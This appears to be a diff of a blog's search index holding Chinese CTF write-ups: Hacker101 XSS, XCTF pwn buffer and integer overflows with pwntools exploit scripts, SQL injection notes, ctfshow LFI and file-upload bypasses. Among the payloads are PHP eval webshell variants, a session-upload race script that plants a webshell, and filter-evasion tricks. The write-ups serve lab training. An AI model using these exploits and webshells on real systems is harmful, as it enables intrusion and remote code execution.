+<p>有意思的是，这个留言板在后端显然把script过滤了，但是这个过滤还是太年轻了，我们尝试换种思路注入</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;buttun onclick=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>同理，我们也可以在标题框注入，这样得到了两个flag。</p>
+<p>那么最后一个flag在哪里？我们这时候尝试创建一个新的留言板。</p>
+<p>进入之后观察，发现新的界面的page跳过3-7，怀疑一下其中有猫腻，于是bp爆破，发现其中一个返回405，其他都是404，进入edit页面之后，访问得到最后一个flag</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+        <category>wp</category>
+        <category>comprehensive</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>hacker101</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn-xctf-新手区wp</title>
+    <url>/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
+    <content><![CDATA[<h2 id="一、Level-2"><a href="#一、Level-2" class="headerlink" title="一、Level_2"></a>一、Level_2</h2><p>pwn到手第一步，先玩一玩看看.</p>
+<span id="more"></span>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_1.png" alt=""></p>
+<p>简单的输入提示，基本上获得不了什么信息。</p>
+<p>pwn到手第二步，反手来一个checksec看看一些基本信息。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>没有PIE，这很好，我们可以再进一步尝试看看，丢到IDA里面，发现函数内有 call  system 和 read，这给了我们布栈的空间。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804844b &lt;+0&gt;:	push   ebp</span><br><span class="line">0x0804844c &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">0x0804844e &lt;+3&gt;:	sub    esp,0x88</span><br><span class="line">0x08048454 &lt;+9&gt;:	sub    esp,0xc</span><br><span class="line">0x08048457 &lt;+12&gt;:	push   0x8048540</span><br><span class="line">0x0804845c &lt;+17&gt;:	call   0x8048320 &lt;system@plt&gt;</span><br><span class="line">0x08048461 &lt;+22&gt;:	add    esp,0x10</span><br><span class="line">0x08048464 &lt;+25&gt;:	sub    esp,0x4</span><br><span class="line">0x08048467 &lt;+28&gt;:	push   0x100</span><br><span class="line">0x0804846c &lt;+33&gt;:	lea    eax,[ebp-0x88]	//read 写入的内存起点</span><br><span class="line">0x08048472 &lt;+39&gt;:	push   eax</span><br><span class="line">0x08048473 &lt;+40&gt;:	push   0x0</span><br><span class="line">0x08048475 &lt;+42&gt;:	call   0x8048310 &lt;read@plt&gt;</span><br><span class="line">0x0804847a &lt;+47&gt;:	add    esp,0x10</span><br><span class="line">0x0804847d &lt;+50&gt;:	nop</span><br><span class="line">0x0804847e &lt;+51&gt;:	leave  </span><br><span class="line">0x0804847f &lt;+52&gt;:	ret  </span><br></pre></td></tr></table></figure>
+<p>从这里我们可以分析出来，我们读入0x88 + 0x04 字节，覆盖ebp -&gt; 写入 call system（0x0804845c）-&gt; 写入 “/bin/sh”的地址。</p>
+<p>当ret时，我们回到了call   0x8048320 <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#115;&#x79;&#115;&#x74;&#101;&#109;&#64;&#112;&#x6c;&#116;">&#115;&#x79;&#115;&#x74;&#101;&#109;&#64;&#112;&#x6c;&#116;</a>，此时esp由于pop eip的效果，此时内部存放着”/bin/sh”的地址，这也顺利地完成了system函数的参数布置。</p>
+<p>Python的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 111.200.241.244:65392</span></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;65392&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./xctf_2&quot;)</span></span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Input:\n&quot;</span></span><br><span class="line">ret_addr = <span class="number">0x804845c</span></span><br><span class="line">bin_addr = <span class="number">0x804a024</span></span><br><span class="line">fill_num = <span class="number">0x88</span> + <span class="number">0x4</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*fill_num + p32(ret_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="二、guess-num"><a href="#二、guess-num" class="headerlink" title="二、guess_num"></a>二、guess_num</h2><p>这道题有点意思，丢到ida里面就可以发现这是一个猜随机数的题。</p>
+<p>这里其实是之前web里面遇到的一个点，我们直接把seed[0]给覆盖了，那么随机数的产生就是确定的。</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_2.png" alt=""></p>
+<p>exp.py如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;60037&quot;</span>)</span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Your name:&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x1</span>)</span><br><span class="line">num_list = [<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam, payload)</span><br><span class="line"></span><br><span class="line">dam_1 = <span class="string">&quot;Please input your guess number:&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.sendlineafter(dam_1,<span class="built_in">str</span>(num_list[i]).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="三、int-overflow（整数溢出）"><a href="#三、int-overflow（整数溢出）" class="headerlink" title="三、int_overflow（整数溢出）"></a>三、int_overflow（整数溢出）</h2><p>整数溢出这个就没什么好说的，在高程作业中做太多了。</p>
+<p>重点是来看看我们要如何利用这个漏洞来实现攻击的，shift+F12，我们可以发现源程序中存在get_shell()的后门，并且没开PIE，这就给了我们re2text的利用空间。</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_3.png" alt=""></p>
+<p>很显然，我们可以尝试利用dest的空间来修改ret的地址，但是我们要如何进入这个分支呢？</p>
+<p>注意到，v3是unsigned __int8 类型，当int  strlen(char *)赋值时，会发生高位截断，所以我们只需要写入一个长度超过256的字符串给s，就能实现栈空间数据的修改。</p>
+<p>补充：我们可以考虑在其他函数中read字符串的时候实现re2text，但是这道题在输入时限制的read的长度，所以我们只能考虑利用整数溢出来实现。</p>
+<p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./xctf_4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(pwnfile)</span></span><br><span class="line">io=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;54657&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_func_name = <span class="string">&quot;what_is_this&quot;</span></span><br><span class="line">leak_func_addr = elf.symbols[leak_func_name]</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x14</span> + <span class="number">0x04</span>) * <span class="string">b&#x27;a&#x27;</span> + p32(leak_func_addr) + (<span class="number">260</span>-<span class="number">0x14</span>-<span class="number">0x04</span>-<span class="number">0x04</span>) * <span class="string">b&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">choice = <span class="string">&quot;1&quot;</span></span><br><span class="line">dam_0 = <span class="string">&quot;Your choice:&quot;</span></span><br><span class="line">io.sendlineafter(dam_0, choice)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;hello&quot;</span></span><br><span class="line">dam_1 = <span class="string">&quot;Please input your username:\n&quot;</span> </span><br><span class="line">io.sendlineafter(dam_1,name)</span><br><span class="line"></span><br><span class="line">dam_2 = <span class="string">&quot;Please input your passwd:&quot;</span></span><br><span class="line">io.sendlineafter(dam_2,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>pwn</category>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>wp</tag>
+        <tag>xctf</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL语法笔记</title>
+    <url>/2022/03/31/blog0010-SQL%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="零、基础知识"><a href="#零、基础知识" class="headerlink" title="零、基础知识"></a>零、基础知识</h2><p>1、<strong>数据类型</strong></p>
+<p>首先我们要了解SQL语句的基本数据类型。</p>
+<p>具体的知识我们可以参考w3cschools : </p>
+<span id="more"></span>
+<p><strong>2、注释</strong></p>
+<p>SQL注入中我们常常需要借助注释的力量。</p>
+<p>常见的注释方法有:</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">/<em> </em>/</th>
+<th style="text-align:center">多行注释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">—</td>
+<td style="text-align:center">行末注释</td>
+</tr>
+<tr>
+<td style="text-align:center">#</td>
+<td style="text-align:center">行末注释（mysql独有的注释符号）</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><strong>3、表的基本操作</strong></p>
+<p>表的操作有增删查改。</p>
+<h2 id="一、数据查询"><a href="#一、数据查询" class="headerlink" title="一、数据查询"></a>一、数据查询</h2><p>不论是何种数据库，设计的意义都是为了方便查询，这也是SQL语法标准的意义所在。对于SQL注入而言，我们主要关心的就是数据的查询。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* 常见的格式如下 */</span><br><span class="line">select * from &#123;table_name&#125; where &#123;limit&#125;</span><br></pre></td></tr></table></figure>
+<p>重要关键词如下：</p>
+<p><code>DISTINCT</code>    : 将返回结果去重</p>
+<p><code>in</code>                 ：SQL注入中可以替代<code>=</code>使用，bypass的点</p>
+<p><code>比较运算符</code>   ：SQL语法中，字符串也可以进行比较（从左向右，根据ASCII码比较）    </p>
+<p><code>LIKE</code>            ：字段条件匹配</p>
+<p>​                          通配符：%  —&gt;    匹配任意字符  </p>
+<p>​                                          _    —&gt;    匹配任意一位字符</p>
+<p><code>order by</code>    ：排序关键字</p>
+<ul>
+<li>order by (id/列的索引)</li>
+<li>（默认升序， DESC 表示降序）</li>
+</ul>
+<p><code>limit</code>            :  限制筛选输出的行数，在SQL server中，使用top 来代替</p>
+<p><code>alias</code>            :  重命名，常用作as，也可以空格代替</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">as</span> whistleh <span class="keyword">from</span> table_user <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> id whistleh	<span class="keyword">from</span> table_user <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)s</span><br></pre></td></tr></table></figure>
+<h2 id="二、函数使用"><a href="#二、函数使用" class="headerlink" title="二、函数使用"></a>二、函数使用</h2><p>SQL语法自带一定的函数，当然在mysql,oracle等等具体的SQL语言中，也会有特定的函数。</p>
+<p><code>min</code>,<code>max</code>,<code>sum</code>,<code>count</code>,<code>avg</code>等都是常见的函数</p>
+<p><code>database</code>    :    输出当前数据库</p>
+<p><code>user</code>            :    输出当前用户        </p>
+<p><code>sleep</code>    :    常用在时间盲注当中</p>
+<p><code>updatexml</code>    :    可以用在报错注入，测试后端是否存在注入点</p>
+<p><code>contact</code>        :    连接字符串，支持ASCII编码</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> contact(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>,@<span class="variable">@datadir</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="三、内置变量"><a href="#三、内置变量" class="headerlink" title="三、内置变量"></a>三、内置变量</h2><p><code>datadir</code>    :    数据库的系统目录</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@datadir</span>;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>数据库</category>
+        <category>sql</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>sql</tag>
+        <tag>数据库</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow-LFI-wp</title>
+    <url>/2022/04/10/blog0011-ctfshow-LFI-wp/</url>
+    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>LFI应该是接触很久的漏洞了，这次来补一下ctfshow的wp。</p>
+<span id="more"></span>
+<h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>PHP伪协议</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>继续PHP伪协议</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=</span><br></pre></td></tr></table></figure>
+<h3 id="web80、web81"><a href="#web80、web81" class="headerlink" title="web80、web81"></a>web80、web81</h3><p>日志包含，在http报文中写入一句话木马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(cmd);highlight_file(<span class="keyword">__FILE__</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后日志包含</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<h3 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h3><p>session包含+条件竞争，主要是利用PHP在上传文件中，会在<code>/tmp/sess_&#123;sessionid&#125;</code>临时文件下，写入<code>PHP_SESSION_UPLOAD_PROGRESS</code>对应的内容，这样就实现了RCE。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ea1277ef-6dd0-4b65-9d85-c0b0e216a679.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data=&#123;</span><br><span class="line">	<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#&lt;?php eval($_POST[1]);?&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url,</span><br><span class="line">			data=&#123;</span><br><span class="line">			<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">			&#125;,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;,</span><br><span class="line">			files=&#123;</span><br><span class="line">			<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">			&#125;</span><br><span class="line">			)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;</span><br><span class="line">			)</span><br><span class="line">		resposne2=session.get(url+<span class="string">&#x27;2.php&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+<h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>看看漏洞出现的代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里题目中有<code>urldecode</code>，因此我们可以两次<code>url</code>编码绕过。</p>
+<p><code>file_put_contents</code>，我们可以利用<code>php</code>伪协议</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=php://filter/write=string.rot13/resource=1.php</span><br></pre></td></tr></table></figure>
+<p>这个协议的意思是我们将内容按<code>rot13</code>编码写入<code>1.php</code>文件,，这样我们就可以将语句中的<code>die</code>语句被处理，同时将我们要写入的内容按<code>rot13</code>编码写入（两次<code>rot13</code>就会回到最初的代码），最后成功绕过。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>cuc @riny(<span class="variable">$_CBFG</span>[<span class="number">1</span>]);uvtuyvtug_svyr(__SVYR__); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//<span class="meta">&lt;?php</span> @eval($_POST[1]);highlight_file(__FILE__);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><p>先看漏洞成因代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里我们观察发现，没有ban引号和斜杠，那我们考虑使用data伪协议来实现文件包含，不过这里还是ban了<code>=</code>和<code>+</code>，这里对于构造的payload比较麻烦，这里分享一个trick：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对于PHP,base64_decode()会自动填充末尾的=</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg&quot;</span>).<span class="string">&quot;\n&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg=&quot;</span>).<span class="string">&quot;\n&lt;br&gt;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>所以后面的事情就很简单了，不再说明了。</p>
+<h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>打开以后是一个视频，我们下载下来，然后提取出其中的PNG图片，直接抓包重放解决问题。</p>
+<h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><p>先看漏洞成因代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">filter(<span class="variable">$file</span>);</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
+<p>还是写入文件，绕过死亡die的一个套路，但是这道题我们的rot13被ban掉了，因此我们需要引入新的编码方式，这里参考了一下羽师傅的payload。</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span><br></pre></td></tr></table></figure>
+<p>这里利用了一个<code>UCS-2LE.UCS-2BE</code>的编码方式，将相邻的两个字符交换位置。</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">content=?&lt;hp pvela$(P_SO[T]1;)&gt;?</span><br></pre></td></tr></table></figure>
+<p>这样就成功写入文件。</p>
+<p>PHP支持的更多编码方式:</p>
+<p><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">https://www.php.net/manual/zh/mbstring.supported-encodings.php</a></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+        <category>wp</category>
+        <category>LFI</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>wp</tag>
+        <tag>ctfshow</tag>
+        <tag>LFI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow-upload-wp</title>
+    <url>/2022/04/11/blog0012-ctfshow-upload-wp/</url>
+    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>文件上传开始</p>
+<span id="more"></span>
+<h3 id="web151（绕过前端校验）"><a href="#web151（绕过前端校验）" class="headerlink" title="web151（绕过前端校验）"></a>web151（绕过前端校验）</h3><p>前端校验要求传入的图片格式为<code>png</code></p>
+<p>将<code>php</code>文件修改后缀为<code>png</code>，抓包重放修改为<code>php</code></p>
+<p>蚁剑连接，成功打通</p>
+<h3 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h3><p>同web151</p>
+<h3 id="web153（-user-ini）"><a href="#web153（-user-ini）" class="headerlink" title="web153（.user.ini）"></a>web153（.user.ini）</h3><p>首先是ban了<code>php</code>，爆破常见后缀名之后，发现基本都无法解析。</p>
+<p>考虑上传<code>.user.ini</code>，然后先检查一下<code>upload</code>目录下是否存在PHP文件，发现存在PHP文件，于是上传两个文件。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//.user.ini</span></span><br><span class="line">auto_append_file=<span class="number">1</span>.png</span><br><span class="line">    </span><br><span class="line"><span class="comment">//1.png</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);highlight_file(<span class="keyword">__FILE__</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上传文件之后，访问同目录下的php文件，实现了文件包含漏洞。</p>
+<h3 id="web154（文件内容校验）"><a href="#web154（文件内容校验）" class="headerlink" title="web154（文件内容校验）"></a>web154（文件内容校验）</h3><p>这道题在web153的基础上，对文件内容进行校验。关于PHP的一句话木马，我们往往有几种类似的表达。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//经典皮肤</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//开启short_open_tags=on</span></span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//不需要开启参数</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//低于7.0的版本</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//低于7.0的版本且开启asp_tags=on</span></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt;</span><br></pre></td></tr></table></figure>
+<p>这道题我们直接选择第三种表达，剩下的步骤和web153一样。</p>
+<h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>同web154</p>
+<h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>过滤了[]，修改一句话木马为</p>
